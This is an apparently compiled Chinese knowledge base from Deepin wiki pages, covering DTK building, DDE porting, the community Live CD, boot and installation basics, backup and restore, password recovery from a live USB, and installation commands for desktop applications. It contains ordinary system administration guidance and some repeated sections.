17 年底，deepin-tool-kit 拆分为 dtkcore、dtkwidget、dtkwm 三个仓库，旧仓库废弃。

19 年新增加了 dtkgui 模块，废弃了 dtkwm，此后 DTK 分为 dtkcore、dtkgui、dtkwidget。

20 年之后，dtk 是多个项目的总称呼，包括 dtkwidget、dtkgui、qt5integration、dtkcore 等。

qt5integration 主要由 iconengines、imageformats、qt5deepintheme-plugin、styleplugins、styles 组成，styleplugins 中的 chameleon 样式是实现 Dxxxxx 控件的主要地方。

dtkwidget 的 src 目录下的 widgets 存放自定义 Dxxxx 控件，是 dtk 开发的主战场。

dtkgui 中 src-dguiapplicationhelper.cpp 文件常被修改，用于实现设计师调整的颜色等参数。

dtk 的 api 文档地址为 https://linuxdeepin.github.io/dtk。

deepin 在 github 的开源地址是 https://github.com/linuxdeepin，包含完整 dtk 项目。

标题：DTK安装与编译
DTK (deepin tool kit) 是基于Qt5开发的一整套UI图形库，便于编写风格统一的深度桌面和深度系列应用。

DTK主要功能：提供单实例接口；提供XCB窗口移动、缩放等函数；提供美观自绘控件。

DTK核心仓库包括dtkcore、dtkgui、dtkwidget、qt5integration。

从源码编译、安装dtk组件，需按dtkcore > dtkgui > dtkwidget的顺序，且版本需一致。

不希望参与开发DTK，推荐切换到相应tag版构建。

从源码编译DTK组件需安装基础环境，命令：sudo apt install git build-essential cmake devscripts doxygen graphviz。

dtkcore是DTK的核心组件，等同于Qt5中的core组件，Deepin系统默认安装。

重新安装dtkcore命令：sudo apt install libdtkcore5 --reinstall；安装开发库命令：sudo apt install libdtkcore-dev。

源码编译dtkcore步骤：git clone -b [tags] https://github.com/linuxdeepin/dtkcore.git；cd dtkcore；sudo apt build-dep ./；cmake -B build；cmake --build build -j$(nproc)。

dtkcore编译后安装方案：debuild -us -uc -b（打包成deb包）；sudo make install（源码安装），推荐debuild。

dtkgui是DTK的图形核心组件，等同于Qt5中的gui组件，Deepin系统默认安装。

重新安装dtkgui命令：sudo apt install libdtkgui5 --reinstall；安装开发库命令：sudo apt install libdtkgui-dev。

源码编译dtkgui步骤：git clone -b [tags] https://github.com/linuxdeepin/dtkgui.git；cd dtkgui；sudo apt build-dep ./；cmake -B build；cmake --build build -j$(nproc)。

dtkwidget是DTK的核心组件，等同于Qt5中的widget组件，Deepin系统默认安装。

重新安装dtkwidget命令：sudo apt install libdtkwidget5 --reinstall；安装开发库命令：sudo apt install libdtkwidget-dev。

源码编译dtkwidget步骤：git clone -b [tags] https://github.com/linuxdeepin/dtkwidget.git；cd dtkwidget；sudo apt build-dep ./；cmake -B build；cmake --build build -j$(nproc)。

qt5integration是DTK的插件组件，等同于Qt5中的plugin组件，Deepin系统默认安装。

重新安装qt5integration命令：sudo apt install qt5integration --reinstall。

源码编译qt5integration步骤：git clone -b [tags] https://github.com/linuxdeepin/qt5integration.git；cd qt5integration；mkdir build && cd build；sudo apt build-dep ../；qmake ..；make。

qt5integration编译后安装方案：sudo make install（源码安装）；debuild -us -uc -b（打包成deb包）。

标题：前言
这一章详细讲解如何将 DDE 移植到其它发行版，移植工作费精神，建议组织人员或参与现有移植小组。

当前有两个与 DDE 移植相关的小组：dde-porting 移植小组和 OpenDDE openkylin 兴趣小组。

dde-porting 移植小组是 deepin 开源社区的兴趣小组，参与将 DDE 移植到 Arch Linux，Fedora，NixOS，Debian，Ubuntu 等多个发行版，相关 patch 贡献回 linuxdeepin 主线代码。

dde-porting 移植小组相关代码以 Pull Request 形式提交到 linuxdeepin 原始仓库上游，可参考现有 Pull Request 了解 patch，鼓励向 linuxdeepin 仓库贡献代码，仓库地址https://github.com/linuxdeepin。

希望参与 Arch Linux，Fedora，NixOS 等发行版的移植或获取帮助，可与 dde-porting 移植组联系，联系地址https://github.com/deepin-community/SIG/tree/master/sig/dde-porting#%E8%AE%A8%E8%AE%BA%E6%B8%A0%E9%81%93。

OpenDDE openkylin兴趣小组由Deepin社区开发者及openkylin爱好者组建，是最初提出将DDE移植到openkylin的成员，将移植过程记录在wiki方便他人移植。

参与 OpenDDE 可访问https://gitee.com/openkylin/community/tree/master/sig/OpenDDE。

标题：深度软件包列表
移植DDE前需了解需移植的软件包数量并按重要性安排工作。

软件包列表包含deepin-camera、deepin-music、deepin-manual等。

软件包列表中有deepin-gtk-theme。

软件包列表包含qt5platform-plugins。

软件包列表中有deepin-font-manager。

dtkcommon是软件包列表中的一个软件包。

软件包列表包含dtkcore、dtkwidget、dtkgui。

软件包列表中有dtkdeclarative。

qt5integration在软件包列表中。

软件包列表包含deepin-anything。

软件包列表中有deepin-system-monitor。

gio-qt是软件包列表中的软件包。

软件包列表包含udisks2-qt5。

软件包列表中有deepin-face。

软件包列表包含deepin-calculator。

deepin-terminal在软件包列表中。

软件包列表包含dde-file-manager。

软件包列表中有dde-control-center。

软件包分类信息参考https://wiki.deepin.org/zh/%E5%BC%80%E5%8F%91%E8%80%85%E6%8C%87%E5%8D%97/DDE%E6%A1%8C%E9%9D%A2%E7%A7%BB%E6%A4%8D/%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%88%86%E7%B1%BB%E4%B8%8E%E7%AE%80%E4%BB%8B。

软件包列表包含deepin-screen-recorder。

dareader是软件包列表中的软件包。

软件包列表包含dde-daemon。

软件包列表中有dde-session-shell。

dde-session-ui在软件包列表中。

软件包列表包含deepin-desktop-schemas。

标题：环境搭建
搭建移植环境需先准备好移植目标发行版系统，演示使用openkylin 1.0，建议用debian系发行版练习。

标题：DDE桌面环境软件包分类与简介
dtk是基于Qt开发的通用开发框架，所有dde桌面软件均使用dtk开发，打包dtk是移植dde的第一步且必要。

编译dde桌面软件后界面显示异常，需qt5integration（Qt platform theme）和qt5platform-plugins（Qt platform plugin）两个QT5插件。

qt5platform-plugins编译时可用"CONFIG+=DISABLE_WAYLAND"参数禁用wayland；目标系统qt版本过新致编译报错，可从新版qt源码拷贝libqt5xcbqpa-dev向上游提交。

qt插件需安装到特殊路径让qt找到，如"/usr/lib/x86_64-linux-gnu/qt5/plugins"，目标发行版路径特殊时可设置QT_PLUGIN_PATH环境变量。

dde-qt-dbus-factory统一存放dde使用的自动生成的Qt DBus代码，是多个项目的依赖，应尽早移植。编译提示缺少libdframeworkdbus时指此库。

应用软件为非必要移植，可选，包括deepin-draw、deepin-calculator、deepin-boot-maker等。

deepin-terminal改字体可能要dde-daemon移植好，可先打包；deepin-picker实时更新需要dde-daemon；deepin-music播放音乐可能要等dde-daemon移植好。

deepin-screen-recorder目前cmake有点问题，请使用qmake构建；deepin-system-monitor可使用编译参数“-DUSE_DEEPIN_WAYLAND=OFF”禁用wayland。

dde-control-center大多数组件可拆卸，可参考Arch禁用一些UOS/Deepin特有功能；dde-network-core是控制中心网络组件所需。

dde-session-ui包括dde-shutdown等系统ui组件，后期必须移植；dde-session-shell包括lightdm-deepin-greeter等，后期必须移植，其src/libdde-auth/deepinauthframework.cpp写死用common-auth（仅debian系特有），需更换，否则锁屏无法解锁。

deepin-clone、dde-device-formatter等移植优先级低；deepin-plymouth、dde-network-utils（已废弃，用networkmanager-qt）、dde-printer一般不移植。

GO语言包中，deepin-pw-check是验证密码有效性的工具，dde-control-center需要；go-lib和go-dbus-factory打包是复制源码，构建依赖软件包时加进GOPATH。

dde-daemon是dde桌面守护进程，非常重要且关键，中后期必须移植；startdde是移植的最后一步，提供startdde命令调起dde服务和应用。

deepin-desktop-schemas有大量dde需要的gsettings schemas文件，移植dde所必须；deepin-network-proxy、lastore-daemon等GO语言包不移植。

Artwork/杂项包括dde-account-faces（本地帐户头像）、deepin-icon-theme（图标主题）等；deepin-wallpapers含非自由许可证，拆包需关注相关讨论。

deepin-desktop-base需要移植，其中distribution.info文件可自行修改，distribution目录有三个系统logo文件，仓库其他文件可参考Arch打包。

dde-kwin代替deepin-kwin（已过时，不要移植），请使用kde官方kwin打包5.5.11-deepin的tag。

标题：Deepin Community Live CD
deepin 发布的 Live CD 有点古老，功能有少许不全，在部分新电脑是无法启动，对 ventoy 兼容性不是很好，故制作此社区版 Live CD。

此 Live CD 基于 deepin 20.8 和原 Live CD 2.0 制作，1.2.1 及以前版本使用特定方案打包，支持 Ventoy 在 Legacy 和 UEFT 模式运行，有常用驱动。

install、full 用户密码（包括root密码）为：123456；tiny、mini root 密码未知。

打包所带程序包括远程协助、TestDisk、ukoapp、deepin 修复工具、CPU-G/CPU-X、GParted等。

Mini 版更新：更新 QQ For Linux 至镜像封装时最高版本。

Full-15.11 版更新：更新 QQ For Linux 至镜像封装时最高版本；更新部分 apt 源内更新内容。

Full 版更新：更新 QQ For Linux 至镜像封装时最高版本；跟进 Deepin 20.8 更新内容。

tiny 版：在原版 Live CD 升级了内核，无多的更新和重新打包，适用于应急等场景，目前只更新到 1.2.0 版本。

mini 版：在 tiny 版本基础上，更新并预装部分应用，1.1.0-mini 新预装 vim、timeshift，升级浏览器，适用于特定用户。

full 版：基于 deepin 20.8 打包，功能完整、预装程序多，无法选择语言，建议优先使用。

install 版：基于 deepin 20.8 打包，功能完整，支持官方安装向导，有维护和安装功能，1.7.0 版待发布。

15.11 版：基于 deepin 15.11 制作，功能比 full 版少，因底层较老。

下载链接包括鹤川云盘、123云盘、百度网盘、和彩云及备用链接。

标题：Deepin Community Live CD Install 新版本
Deepin Community Live CD 简称为 DCLC，该镜像同时拥有原 DCLC 功能和系统安装功能，预装软件及配置以简化安装后操作，不修改 deepin 系统信息，非下游发行版，仅为定制镜像。Live CD 模式下用户默认密码：123456，root 密码：123456，安装到本地不受此影响。

更新内容包括：跟进系统版本为 20.8；更新预装的星火应用商店（4.0.1）和 Wine 运行器（3.0.0.1-uos）版本；开始选择性安装 UEngine 安卓环境和 UEngine 运行器（可通过断网或体验模式下添加自定义脚本修改）。

预装软件有星火应用商店、Wine 运行器、QQ（Wine）、微信（Wine）、WPS Office、钉钉、Todesk、TimeShift、udom 工具箱、deepin 全家桶、UOS 远程协助、rdp 远程桌面连接工具、搜狗输入法、deepin wine6 stable 等，其中部分软件仅存在于 Live CD 环境下。

提示：断网安装不会安装 WPS、QQ、微信这三个体积大的软件；体验模式可当 Live CD 用。

下载链接包括鹤川云盘、123 云盘、迅雷云盘（提取码：5mgs）、百度网盘（提取码：ejr7）、备用链接及程序论坛。

标题：Deepin安装相关信息
BIOS是开机时第一个被执行的程序，又名固件，储存在主板上的一块闪存中，与硬盘独立。

传统BIOS引导中，BIOS会按启动顺序加载磁盘前512字节即主引导记录，前440字节包含第一启动阶段代码，后续代码存于磁盘，最后启动引导器通过链式引导或直接加载内核启动操作系统。

UEFI能读取分区表，支持文件系统，无MBR的440字节限制，依赖EFI系统分区中的文件，该分区一般格式化为FAT32或FAT16。

UEFI多重引导中，每个操作系统可维护自己EFI系统分区中的文件，运行不同UEFI程序即可，避免依赖chainloading机制。

UEFI引导过程：系统开机上电自检，UEFI固件加载并初始化硬件，读取引导管理器确定加载哪个UEFI应用，按启动项目加载，已启动的UEFI应用可启动其他应用或内核及initramfs。

NTLDR是微软Windows NT系列操作系统（包括Windows XP和Windows Server 2003）的引导程序，由NTLDR和boot.ini组成，必须放在系统分区。

bootmgr是从Windows Vista开始引进的开机管理程序，替换NTLDR，传统BIOS查找引导分区下的bootmgr文件，UEFI则是bootmgr.efi文件，读取BCD内的引导数据。

GNU GRUB是多启动规范的实现，允许用户在多个操作系统中选择，可选择不同内核并传递启动参数，有GRUB Legacy和GRUB2版本。

vmlinux是未压缩、静态链接、不可引导的Linux内核中间文件，vmlinuz是压缩、可引导的，实际是zImage或bzImage，目前桌面系统vmlinuz即bzImage。

initrd是由bootloader初始化的内存盘，2.4及以前内核只支持image-initrd，核心文件是/linuxrc；2.6及以后支持两种，目前发行版几乎用cpio-initrd，核心文件是/init。

Deepin安装环境要求：处理器Intel Pentium IV 2GHz或更快，内存至少2G（4G以上推荐），硬盘至少10GB空闲空间。

下载Deepin镜像后需校验，Windows用certutil.exe -hashfile命令，Linux用md5sum命令，确认MD5值与下载页一致。

制作Deepin启动U盘用深度启动盘软件，需提前转移数据，建议格式化为FAT32，容量不小于2G，制作中不要触碰U盘。

全新安装Deepin单系统，需留出至少20G未分配空间或空白分区，已有数据需备份或调整分区。

安装Windows和Deepin双系统应先装Windows，再装Deepin，因Windows安装会重写分区表，需保证20G以上未分配空间。

进入BIOS设置启动项，台式机一般按Delete键，笔记本一般按F2、F10或F12键。

Deepin安装中，/根分区必选EXT4格式，最少10G；/home推荐EXT4，最少10G；swap交换分区可选，4G内存以下分配2G，以上可不分配。

进入Live环境可通过系统修复光盘或U盘启动计算机，进入chroot环境需先挂载相关分区再执行sudo chroot /tmp/mnt命令。

传统BIOS下修复GRUB引导，在chroot环境用grub-install --boot-directory=/boot /dev/sda和update-grub命令。

UEFI模式下修复GRUB引导，在chroot环境用grub-install --boot-directory=/boot --efi-directory=/boot/efi和update-grub命令。

标题：Deepin文件系统
deepin的默认文件系统是ext4，大多数linux系统均采用ext格式的磁盘文件系统。ext4是linux下的日志文件系统。

查看磁盘文件类型的命令是df -Th。

/boot分区的磁盘文件类型是ext4，是引导分区。

/boot/efi分区的磁盘文件类型是vfat(fat32)，是efi引导分区。

/(根分区)的磁盘文件类型是ext4，是整个linux磁盘分区。

/dev分区的磁盘文件类型是udev，是设备管理分区。udev是设备节点。

/dev/shm分区的磁盘文件类型是tmpfs，用于管理磁盘、内存等设备。tmpfs是基于内存的暂时文件系统。

/run分区的磁盘文件类型是tmpfs，是以前的/dev/run，用于正在运行线程和设备。

/run/lock分区的磁盘文件类型是tmpfs，用于部分线程锁文件。

/run/user/1000分区的磁盘文件类型是tmpfs，用于正在运行的设备。

sys/fs/cgroup分区的磁盘文件类型是tmpfs，用于分组线程进行管理。

tmpfs是基于内存的暂时文件系统。

deepin linux是自动挂载U盘或者移动硬盘的，命令行下操作的挂载点在/media/(用户名)/(U盘名字或者U盘的uuid)。

标题：Deepin的备份恢复
系统备份还原工具用于应对因多种因素导致的数据缺失，进行数据或系统还原，保障系统和软件正常运行。

设计系统备份还原工具是为了：用户进行不可预测操作时备份、系统未备份却损坏时恢复出厂设置、完成送测大纲要求、满足厂商一键还原硬件指标。

初始化备份在系统全盘安装完成时进行，创建恢复分区，备份启动分区和根分区，保存恢复分区信息和磁盘分区配置。

进入控制中心备份的路径是：控制中心-系统信息-备份/还原-备份，点击“...”选择备份保存路径。

备份失败会提示用户失败原因并删除失败文件，同时将原因发送给开发者。

备份有全盘备份和系统备份两种模式，全盘备份备份全磁盘系统文件和用户文件，系统备份备份根分区、启动分区。

全盘备份只能备份到其它存储介质，系统备份默认有存放位置，磁盘空间不足时会提示，允许手动选择位置。

点击“备份”后输入正确密码，会计算备份容量是否满足磁盘空间，不足则提示“磁盘空间不足”。

备份还原开启后，配置文件写入完毕立即重启进入live系统进行备份。

备份时需记录磁盘唯一标识，用于还原时磁盘更换提醒。

备份文件成功后需写入此次备份对应信息，写入失败提示“写入备份信息失败”。

准备备份时找不到当前系统所在磁盘，提示“找不到当前操作系统所在磁盘”。

开始备份遇到异常终止，提示“创建任务失败”。

点击备份后修改系统配置时，显示“正在配置中...”提示。

备份支持的存储介质文件系统格式有ext4、ntfs、xfs、btrfs、reiserfs、exfat，不支持则提示“该存储介质的文件系统不支持备份”。

开机选择系统界面添加“Deepin Restore”选项，用于Grub进入还原流程。

选择恢复的文件需验证准确性，验证失败提示“备份文件有误”。

选择“恢复出厂设置”读取恢复出厂设置备份，选择“恢复历史备份”打开文件目录选取备份。

选择保留个人数据，将保留用户磁盘中已存在的数据。

“自定义恢复”可从其他路径或磁盘分区选择已备份的文件。

系统还原失败后提示用户并将失败原因发送给开发者。

还原系统时提示“系统还原将失去现有系统数据”。

备份文件不会跟随还原丢失。

选择的备份文件与备份时的磁盘信息不一致，提示“磁盘信息与备份信息不一致，无法进行还原”并终止还原。

准备还原时找不到当前系统所在磁盘，提示“找不到当前操作系统所在磁盘”。

开始还原遇到异常终止，提示“创建任务失败”。

未进行还原操作时点击右上角“x”重启计算机，进行操作时隐藏“x”防止退出导致失败。

标题：Deepin移植
深度操作系统是注重易用体验和美观设计的Linux发行版，有深度商店等特色应用，支持30多种语言，下载量达5000万次，全球关注度前20名。

部分主流Linux发行版集成深度桌面环境和应用，社区爱好者协助移植到不同发行版。

深度系统可下载的发行版包括Archlinux、Manjaro、ubuntu、Gentoo、Fedora、SparkyLinux、Puppy Linux。

深度桌面移植的相关链接是https://www.deepin.org/dde/desktop-transplantation/。

标题：Deepin衍生版
深度操作系统是注重易用体验和美观设计的Linux发行版，有深度商店等特色应用，支持30多种语言，下载量超4000万次，全球关注度前10。

部分主流Linux发行版集成深度桌面环境和应用，社区爱好者也将其移植到不同发行版。

基于DDE的发行版有Manjaro Deepin、BigLinux、UbuntuDDE。

相关链接有《Deepin家族又添新成员，中国开源操作系统回馈世界》。

标题：live系统修改密码
进入deepin的live系统需准备装有deepin镜像的启动U盘，启动到安装界面，在grub安装界面按“E”键（非EFI启动按TAB键），删除“cd-installer”内容，按F10进入。

live系统下长时间自动锁屏且无密码，可按ctrl+alt+F2进入TTY，输入sudo passwd uos设置密码，再切回登录。

切换chroot目录步骤：在live系统打开文件管理器，找到根目录分区，进入后右键空白处打开终端，输入sudo chroot ./。

修改用户密码需确认用户名，在终端执行passwd 用户名，按提示设置新密码。

完成密码修改后，重启系统即可用新密码登录。

标题：修改键盘映射
可借助gsettings命令调整系统键盘映射，适应不同用户需求。

查看所有键盘映射可用命令：localectl list-x11-keymap-options。

查看与CapsLock键有关的映射可用命令：localectl list-x11-keymap-options | grep caps:。

取消按下CapsLock时的osd提示框：gsettings set com.deepin.dde.keybinding.mediakey capslock '[]'。

交换CapsLock与Esc键：gsettings set com.deepin.dde.keyboard layout-options '["caps:swapescape"]'。

禁用CapsLock键：gsettings set com.deepin.dde.keyboard layout-options '["caps:none"]'。

单独恢复CapsLock键原设置：gsettings reset com.deepin.dde.keybinding.mediakey capslock；gsettings reset com.deepin.dde.keyboard layout-options。

恢复整个键盘布局默认设置：gsettings reset-recursively com.deepin.dde.keybinding.mediakey；gsettings reset-recursively com.deepin.dde.keyboard。

修改键盘映射的命令会立即生效，无需重启系统。

标题：光标主题自定义
深度操作系统默认桌面环境下可安装鼠标主题。

便捷安装鼠标主题：下载deb后缀的主题文件，打开控制中心——个性化——鼠标设置。

为所有用户手动安装鼠标主题：用sudo dde-file-manager /usr/share/icons打开目录，复制主题文件，进入/usr/share/icons/default/删除子文件，新建index.theme，内容为Inherits=主题文件夹名，最后在控制中心设置。

为当前用户安装鼠标主题（推荐，无需root）：下载主题文件，解压至~/.icons文件夹，在控制中心切换。

鼠标主题文件的特征：包含cursors文件夹和index.theme文件。

卸载鼠标主题：用sudo dde-file-manager /usr/share/icons打开目录，删除不需要的主题文件。

鼠标主题资源可在https://www.gnome-look.org/browse/cat/107/ord/top/下载，国内访问可能慢。

标题：Deepin源代码
绝大部分DDE相关开源社区组件的仓库已迁移至GitHub，未迁移部分计划未来迁移。

项目迁移进度可在GitHub的developer-center讨论版跟进。

已迁移项目可按developer-center的wiki贡献指南参与开发。

通过GitHub的Pull Request参与贡献，名字会出现在仓库contributor列表。

参与贡献的网址是https://github.com/linuxdeepin。

developer-center讨论版网址为https://github.com/linuxdeepin/developer-center/discussions/3050。

贡献指南网址是https://github.com/linuxdeepin/developer-center/wiki/Contribution-Guidelines-for-Developers。

提交issue的网址为https://github.com/linuxdeepin/developer-center/discussions。

标题：用apt-fast加速软件包下载
apt-fast是一款命令行工具，能够通过多线程下载软件包来提升下载应用和更新的速度。

安装软件包的命令：sudo apt install [软件包名]，输入后终端会列出将要安装的软件包并询问是否执行，输入Y并回车。

不知道软件包名时，可输入命令apt search --names-only [关键词]查询，关键词需短而准确。

更新系统和软件的命令：sudo apt update && sudo apt full-upgrade，终端会列出相关信息并询问是否执行，输入Y并回车。

执行带sudo的命令时需输入密码，密码不显示，输完按回车；跳过确认操作可在命令末尾加 -y；按Ctrl+C可终止命令运行。

系统若有星火应用商店，可直接用sudo apt install apt-fast安装apt-fast，但非最新版本。

安装apt-fast的步骤之一：进入/etc/apt/source.list.d/文件夹，以管理员身份打开，新建apt-fast.list文件。

apt-fast.list文件需写入：deb http://ppa.launchpad.net/apt-fast/stable/ubuntu focal main 和 deb-src http://ppa.launchpad.net/apt-fast/stable/ubuntu focal main。

安装apt-fast需在终端依次执行：apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A2166B8DE8BDC3367D1901C11EE2FF37CA8DA16B、sudo apt update、sudo apt install apt-fast。

安装apt-fast时有3项设定，第1项选择apt，第2项和第3项按个人习惯选择。

使用apt-fast时，将命令中的apt替换成apt-fast即可，一般用于下载软件包或更新时。

标题：DigiKam
digiKam是一款跨平台的数字照片管理软件，支持大多数图像格式，可按日期、时间或标签整理图片，能添加标题和评语、编辑、预览、扩展等。

安装digiKam的命令是sudo apt-get install digikam。

卸载digiKam的命令是sudo apt-get remove digikam。

digiKam的仓库地址是http://packages.deepin.com/deepin/pool/main/d/digikam/。

标题：EyeOfGnome
EyeOfGnome是一款图像查看器软件，支持多种图片格式，有放大/缩小等功能。

安装EyeOfGnome的命令是sudo apt-get install eog。

卸载EyeOfGnome的命令是sudo apt-get remove eog。

EyeOfGnome的仓库地址是http://packages.deepin.com/deepin/pool/main/e/eog/。

标题：Gwenview
Gwenview是一个图片浏览和管理软件，以文件夹方式管理图片，有图片编辑、修改、重命名、移动等功能，可通过缩略图、幻灯片查看图片，能读取tar/zip压缩包中图像文件，可通过插件扩展功能。

安装Gwenview的命令是sudo apt-get install gwenview。

卸载Gwenview的命令是sudo apt-get remove gwenview。

Gwenview的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gwenview/。

标题：Shotwell
Shotwell是一款轻量级的图片管理软件，可从数码相机导入相片，能管理图片、提供基本编辑功能，可剪裁图片并分享。

安装Shotwell的命令是sudo apt-get install shotwell。

卸载Shotwell的命令是sudo apt-get remove shotwell。

Shotwell的仓库地址是http://packages.deepin.com/deepin/pool/main/s/shotwell/。

标题：XnConvert
XnConvert是一款多功能图像批处理工具，可实现图像格式转换、缩放、添加滤镜等功能，支持多种图片格式。

安装XnConvert的命令为：sudo apt-get install xnconvert。

卸载XnConvert的命令是：sudo apt-get remove xnconvert。

XnConvert的仓库地址为http://packages.deepin.com/deepin/pool/main/x/xnconvert/。

标题：XnView_MP
XnView MP是一款图像查看工具，支持150种图片格式，有查看、浏览、幻灯显示等功能，自带30多面滤镜，可批量转换文件格式、创建缩略图、生成网页、制作GIF，小巧实用。

安装XnView MP的命令是sudo apt-get install xnview。

卸载XnView MP的命令是sudo apt-get remove xnview。

XnView MP的仓库地址是http://packages.deepin.com/deepin/pool/main/x/xnview/。

标题：BirdFont
BirdFont是一个免费的字体编辑器，可创建矢量图形及TTF、EOT和SVG字体，还能创建专属个性字体。

安装BirdFont的命令是sudo apt-get install birdfont。

卸载BirdFont的命令是sudo apt-get remove birdfont。

BirdFont的仓库地址是http://packages.deepin.com/deepin/pool/main/b/birdfont/。

标题：Deepin OpenSymbol
Deepin OpenSymbol是深度科技团队在Wingdings系列字体内容上重新绘制的一系列符号字体，含常用速记、手势、箭头、星形等符号。

安装Deepin OpenSymbol的命令是sudo apt-get install ttf-deepin-opensymbol。

卸载Deepin OpenSymbol的命令是sudo apt-get remove ttf-deepin-opensymbol。

Deepin OpenSymbol的仓库地址是http://packages.deepin.com/deepin/pool/main/t/ttf-deepin-opensymbol/。

Deepin OpenSymbol的官方介绍可参考https://www.deepin.org/original/deepin-opensymbol/。

标题：字体查看器
字体查看器是一个查看字体的应用程序，它允许用户查看和浏览所有已安装的字体，同时可以查看字体的详细信息。

sudo apt-get install gnome-font-viewer

sudo apt-get remove gnome-font-viewer

http://packages.deepin.com/deepin/pool/main/g/gnome-font-viewer/

标题：搜狗输入法在RStudio下无法切换的解决办法
解决办法为：
dpkg-deb -R  fcitx-frontend-qt5-rstudio_1.0.5-1_amd64.deb    fcitx-frontend-qt5-rstudio (解压deb包)

然后把解压出来的文件fcitx-frontend-qt5-rstudio/usr/lib/rstudio/　　目录下面的对应文件拷贝到系统/usr/lib/rstudio/目录下面

同理
dpkg-deb -R  libfcitx-qt5-1-rstudio_1.0.5-1_amd64.deb  libfcitx-qt5-1-rstudio(解压deb包)

把解压目录对应的libfcitx-qt5-1-rstudio/usr/lib/rstudio/  拷贝到/usr/lib/rstudio目录下面重新启动rstudio即可。

原理是如果dpkg安装会检测依赖关系，有依赖问题则无法安装，这个手动安装不用管依赖问题。

标题：WPS显示问题
WPS表格中，横行ABCD...和数列1234...显示不全的问题。问题产生原因是WPS表格默认字体为宋体，而deepin系统没有宋体。解决思路有两种：1. 从Windows系统拷贝宋体文件C:\Windows\Fonts\simsun.ttc和simsunb.ttf到deepin安装；2. 修改WPS表格默认字体：点击文件 - 选项 - 常规与保存 - 标准字体，将正文字体改为Noto Sans CJK SC Regular等系统自带字体，保存后新建表格。

用户反馈WPS标题栏位置异常（不居中或看不见），论坛建议检查字体问题。参考历史解决方案：通过修改WPS默认字体（路径：文件-选项-常规与保存-标准字体）可修复显示异常。

WPS文档表格文字仅部分显示：选中表格文字→段落设置→将行距「固定值」调大（如从8磅改为12磅），即可完整显示。

WPS表格网格线消失：点击顶部「视图」选项卡，勾选「显示网格线」即可恢复。

标题：LibreOffice
LibreOffice是一款功能强大的办公套件，可用于文本文档、电子表格、演示文稿、绘图、数据库以及数学公式编辑和处理，libreoffice拥有强大的数据导入和导出功能，能直接导入PDF文档、微软Works，支持主要的OpenXML格式。

sudo apt-get install libreoffice

sudo apt-get remove libreoffice

http://packages.deepin.com/deepin/pool/main/libr/libreoffice/

高分屏下 LibreOffice 的图标显示不清晰，是因为默认情况下的图标主题不是矢量化的。可以在 工具>选项>LibreOffice>视图>图标主题 中调整主题至 SVG 主题。

高分屏下 LibreOffice 的图标显示不清晰，是因为默认情况下的图标主题不是矢量化的。可以在 `工具>选项>LibreOffice>视图>图标主题` 中调整主题至 SVG 主题。

https://bugs.documentfoundation.org/show_bug.cgi?id=115439

标题：Open365
Open365是一款Office文档处理软件，支持在线创建和编辑、云同步等功能，默认支持20G云存储工具，注册帐号后并登录平台，会列出目前所有的文档内容，支持创建文件夹，所支持的文档格式有docx、xlsx、pptx、JPG、PNG、音视频格式。

sudo apt-get install open365-client

sudo apt-get remove open365-client

http://packages.deepin.com/deepin/pool/main/o/open365-client/

仓库地址: http://packages.deepin.com/deepin/pool/main/o/open365-client/

标题：WPS Office
WPS Office是由金山软件股份有限公司自主研发的一款办公软件套件，可以实现办公最常用的文字、表格、演示等多种功能。免费提供海量的在线存储空间及文档模板、支持阅读和输出PDF文件、全面兼容Microsoft Office 97-2010格式。

sudo apt-get install wps-office

sudo apt-get remove wps-office

http://packages.deepin.com/deepin/pool/non-free/w/wps-office/

这是在Deepin系统中使用WPS最常遇到的问题，现象通常为在Deepin端的WPS中查阅在Windows端编辑完成的文档，文档中的每一行只显示一半，就像叠加在一起一样。出现这种情况是因为Deepin是一个开源社区操作系统，而WPS中常用字体则大多需要商业授权，Deepin无法将其集成到系统内，Deepin端WPS缺失相应的字体，从而导致文档排版错乱。解决方法是通过Deepin的字体管理器安装相应的字体，更方便的方法是从星火商店下载`Win字体`软件，安装该软件可以将Windows中默认字体全部安装到Deepin中。

这不一定是WPS的问题，但如果你使用其他软件都很流畅，可唯独使用WPS非常卡顿的话，在WPS的`设置-其他-切换窗口管理模式`中将`整合模式`改为`多组件模式`说不定能解决你的问题

1. 排版错乱 这是在Deepin系统中使用WPS最常遇到的问题，现象通常为在Deepin端的WPS中查阅在Windows端编辑完成的文档，文档中的每一行只显示一半，就像叠加在一起一样。出现这种情况是因为Deepin是一个开源社区操作系统，而WPS中常用字体则大多需要商业授权，Deepin无法将其集成到系统内，Deepin端WPS缺失相应的字体，从而导致文档排版错乱。 解决方法是通过Deepin的字体管理器安装相应的字体，更方便的方法是从星火商店下载`Win字体`软件，安装该软件可以将Windows中默认字体全部安装到Deepin中。

2. 使用卡顿 这不一定是WPS的问题，但如果你使用其他软件都很流畅，可唯独使用WPS非常卡顿的话，在WPS的`设置-其他-切换窗口管理模式`中将`整合模式`改为`多组件模式`说不定能解决你的问题

标题：永中Office
永中Office是一款功能强大的办公软件，已经集成了文字处理、电子表格和简报制作三大应用。永中Office对微软Office文档实现双向精确兼容，其精确专业的排版、强大的数据透视表和丰富的插件机制，完全可以满足专业级用户的需求。

sudo apt-get install yozo-office-zh-cn

sudo apt-get remove yozo-office-zh-cn

http://packages.deepin.com/deepin/pool/non-free/y/yozo-office-zh-cn/

标题：AbiWord
AbiWord是一款功能完备的高效文字处理软件，提供了强大的文字处理功能，非常适合处理文书、信件、报告、备忘录等常用办公文件，并且可通过各种插件进行扩展，使AbiWord能与其他格式的文件进行交互。

sudo apt-get install abiword

sudo apt-get remove abiword

http://packages.deepin.com/deepin/pool/main/a/abiword/

标题：Gnumeric
Gnumeric是一款电子表格处理软件，操作方式与Excel非常相似。Gnumeric能够导入导出多种数据格式，支持包括中文在内的多种语言，并且可以自定义扩展行列数。

安装Gnumeric的命令为：sudo apt-get install gnumeric

卸载Gnumeric的命令为：sudo apt-get remove gnumeric

Gnumeric的仓库地址是：http://packages.deepin.com/deepin/pool/main/g/gnumeric/

sudo apt-get install gnumeric

sudo apt-get remove gnumeric

标题：LyX
LyX是一款利用LaTeX来排版的文件编辑软件，其强大的文档格式处理能力，让用户可以方便的进行文件排版。Lyx拥有良好的图形操作界面，可以导入/导出各种常用的文本格式。在Lyx中您只需要专注于正在编写的内容， 其他的事情就交给Lyx吧！

sudo apt-get install lyx

sudo apt-get remove lyx

http://packages.deepin.com/deepin/pool/main/l/lyx/

维基百科：

标题：FocusWriter
